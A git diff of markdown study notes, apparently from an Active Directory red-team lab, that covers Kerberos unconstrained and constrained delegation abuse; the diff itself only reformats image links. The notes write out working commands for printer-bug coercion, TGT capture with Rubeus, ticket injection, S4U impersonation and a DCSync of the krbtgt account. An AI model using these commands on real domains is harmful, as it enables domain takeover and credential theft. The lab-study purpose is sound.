@@ -1,9 +1,9 @@
 Kerberos Delegation allows the reuse of end-user credentials to access resources hosted on a different server
 - example - user authenticates to a web server (first hop) and web server makes requests to database server (second hop)
 - user impersonation is the goal of delegation
-![[assets/Pasted image 20260221012448.png]]
+![Pasted image 20260221012448](assets/Pasted%20image%2020260221012448.png)
 - the web server should be able to access the database server as the user (impersonation)
-![[assets/Pasted image 20260221012859.png]]
+![Pasted image 20260221012859](assets/Pasted%20image%2020260221012859.png)
 - even though we are in a PowerShell session as adminsrv, the first hope (PowerShell session) is not allowed to delegate to the domain controller
 
 two main solutions
@@ -19,7 +19,7 @@ two main solutions
 When this is enabled, the DC places a user's TGT inside the TGS. 
 - on the first hope, the TGT is extracted from the TGS and stored in LSASS, so the server can reuse the user's TGT to access any other resource as the user
 - this one is ripe for abuse
-![[assets/Pasted image 20260221013438.png]]
+![Pasted image 20260221013438](assets/Pasted%20image%2020260221013438.png)
 
 Discover Domain Computers which have unconstrained delegation enabled
 - PowerView
@@ -35,7 +35,7 @@ Once the first hope is compromised, wait for the domain admin to connect to a se
 `SafetyKatz.exe "kerberos::ptt C:\Users\<user>\Documents\<user>\[0;2ceb8b3-2-0-60a10000-Administrator@krbtgt-<DOMAIN>.kirbi"`
 
 Coercion - certain Microsoft services allow any authenticated user to force a machine to connect to a second machine
-![[assets/Pasted image 20260221014501.png]]
+![Pasted image 20260221014501](assets/Pasted%20image%2020260221014501.png)
 
 - capture TGT using Rubeus
 `Rubeus.exe monitor /interval:5 /nowrap`
@@ -58,8 +58,8 @@ Coercion - certain Microsoft services allow any authenticated user to force a ma
 ## Find a server in the dcorp domain where Unconstrained Delegation is enabled
 
 `Get-DomainComputer -Unconstrained`
-![[assets/Pasted image 20260221015423.png]]
-![[assets/Pasted image 20260221015446.png]]
+![Pasted image 20260221015423](assets/Pasted%20image%2020260221015423.png)
+![Pasted image 20260221015446](assets/Pasted%20image%2020260221015446.png)
 
 
 ## Compromise the server and escalate to Domain Admin privileges
@@ -80,11 +80,11 @@ run Rubeus listening mode in memory
 go back to student VM and force domain controller to connect to appsrv
 `C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local`
 - even if you get an RPC Server failed error, still check if Rubeus caught a TGT
-![[assets/Pasted image 20260221020256.png]]
+![Pasted image 20260221020256](assets/Pasted%20image%2020260221020256.png)
 
 from an elevated shell, inject the TGT
 `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args ptt /ticket:<TGT>`
-![[assets/Pasted image 20260221020352.png]]
+![Pasted image 20260221020352](assets/Pasted%20image%2020260221020352.png)
 
 run DCSync attack with imported ticket
 `C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "lsadump::dcsync /user:<DOMAIN>\krbtgt"`
@@ -107,7 +107,7 @@ run DCSync attack with imported ticket
 
 allows access only to specified services on specified computers
 - protocol transition is used when a user authenticates to a web service without using Kerberos and t he web service makes requests to a database server to fetch results based on a user's authorization
-![[assets/Pasted image 20260221022041.png]]
+![Pasted image 20260221022041](assets/Pasted%20image%2020260221022041.png)
 
 to impersonate a user, Service for User (S4U) is used which provides two extensions
 - S4U2self - allows service to obtains a forwardable TGS to itself on behalf of a user with just the UPN without supplying the password
@@ -117,10 +117,10 @@ to impersonate a user, Service for User (S4U) is used which provides two extensi
 Enumerate users with constrained delegation enabled
 - PowerView
 `Get-DomainUser -TrustedtoAuth`
-![[assets/Pasted image 20260221023214.png]]
+![Pasted image 20260221023214](assets/Pasted%20image%2020260221023214.png)
 - if i compromise websvc, i can access the file system on dcorp-mssql as DA
 `Get-DomainComputer -TrustedtoAuth`
-![[assets/Pasted image 20260221024203.png]]
+![Pasted image 20260221024203](assets/Pasted%20image%2020260221024203.png)
 - ActiveDirectory Module
 `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`
 
@@ -129,14 +129,14 @@ Request a TGT and TGS in a single command
 `Rubeus.exe s4u /user:<user> /aes256:<aes_key> /impersonateuser:Administrator /msdsspn:<SPN> /ptt`
 - to get aes key, you can use his mimikatz keys script
 	- `./Invoke-MimiEx-keys-std1.ps1`
-![[assets/Pasted image 20260221024935.png]]
+![Pasted image 20260221024935](assets/Pasted%20image%2020260221024935.png)
 - make sure to look at the SID for the correct key, keys using SYSTEM privileges will have `S-1-5-18`
 
 
 since the SPN is in cleartext, we are able to change it to abuse S4U2proxy (choosing services that can delegate)
 `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args s4u /user:<user> /aes256:<aes_key> /impersonate:Administrator /msdsspn:<SPN> /altservice:ldap /ptt`
 - putting the alt service (in this case LDAP) will change what the ticket is used for
-![[assets/Pasted image 20260221025516.png]]
-![[assets/Pasted image 20260221025553.png]]
+![Pasted image 20260221025516](assets/Pasted%20image%2020260221025516.png)
+![Pasted image 20260221025553](assets/Pasted%20image%2020260221025553.png)
 - this means you can now run DCSync using this ticket
 
